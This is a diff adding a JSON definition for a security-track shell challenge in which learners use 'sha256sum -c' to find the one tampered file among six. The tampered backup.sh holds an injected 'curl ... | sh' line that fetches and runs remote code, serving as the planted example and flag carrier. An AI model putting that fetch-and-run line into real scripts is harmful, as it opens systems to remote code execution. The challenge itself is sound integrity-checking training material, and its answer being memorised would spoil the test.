@@ -1,0 +1,74 @@
+{
+  "id": "sec-06-integrity",
+  "type": "shell-challenge",
+  "track": "security",
+  "title": "The tampered file",
+  "xp": 45,
+  "prerequisites": [
+    "sec-05-whichfile"
+  ],
+  "review_interval_days": null,
+  "prompt": "MANIFEST.sha256 records the known-good checksum of every file in payload/. Someone has modified exactly one of them. sha256sum -c MANIFEST.sha256 re-checks every file against the manifest and prints FAILED for any that don't match. Find the tampered file and read it — the injected line carries the flag.",
+  "setup": {
+    "files": [
+      {
+        "path": "MANIFEST.sha256",
+        "contents": "2e52659629c4c352002fcb24401c75cecab968aa371bb3a4c63b0f1f07c1b0f0  payload/app.conf\na4a16a6edd1fe73fe2c7496c23da41e5ec1a4af3f09028b12899081c0a93349c  payload/notes.txt\n9eb5b197b852b277c20a8b8a3616cae3bf605cf39ffc3cc9aca30cf9aee30134  payload/hosts.allow\nd2f194989fa5c1980ac7ffb77e1dfef99473550275e75fd291dd83614d05b1ac  payload/index.html\nc831c1fc52d60953a36860f066aa7d6a40141c0688e79713b33fd79ae8cf1ed2  payload/cron.txt\n2618f924b432c85634693a353785e71563703f9d23b1b825751961fe6337a743  payload/backup.sh\n"
+      },
+      {
+        "path": "payload/app.conf",
+        "contents": "port 8080\nworkers 4\n"
+      },
+      {
+        "path": "payload/notes.txt",
+        "contents": "rotate keys quarterly\n"
+      },
+      {
+        "path": "payload/hosts.allow",
+        "contents": "192.168.1.0/24\n"
+      },
+      {
+        "path": "payload/index.html",
+        "contents": "<h1>status: green</h1>\n"
+      },
+      {
+        "path": "payload/cron.txt",
+        "contents": "0 3 * * * /usr/local/bin/backup\n"
+      },
+      {
+        "path": "payload/backup.sh",
+        "contents": "#!/bin/sh\ntar -czf /srv/backup.tgz /etc\ncurl -s http://203.0.113.66/x | sh   # <- injected: {{FLAG}}\n"
+      }
+    ]
+  },
+  "verification": {
+    "runner": "artifact-check",
+    "checks": [
+      {
+        "kind": "flag"
+      }
+    ]
+  },
+  "details": {
+    "restate": "Verify every file in payload/ against MANIFEST.sha256. Exactly one fails the check. Open that file, find the line that doesn't belong, submit the flag on it.",
+    "io": [
+      {
+        "call": "sha256sum -c MANIFEST.sha256",
+        "returns": "payload/app.conf: OK ... payload/backup.sh: FAILED",
+        "because": "-c mode re-hashes each listed file and compares against the recorded checksum"
+      }
+    ],
+    "terms": [
+      {
+        "term": "checksum",
+        "meaning": "a fingerprint of a file's exact contents — change one byte and the fingerprint changes completely"
+      }
+    ]
+  },
+  "help": {
+    "plain": "Don't eyeball six files — let the checksums point at the one that changed.",
+    "analogy": "Wax seals on six envelopes: you don't read every letter to find the opened one, you look for the broken seal.",
+    "mnemonic": "sha256sum -c: c for Check against the manifest.",
+    "nudge": "The manifest already knows what every file SHOULD hash to. Which command replays that comparison?"
+  }
+}
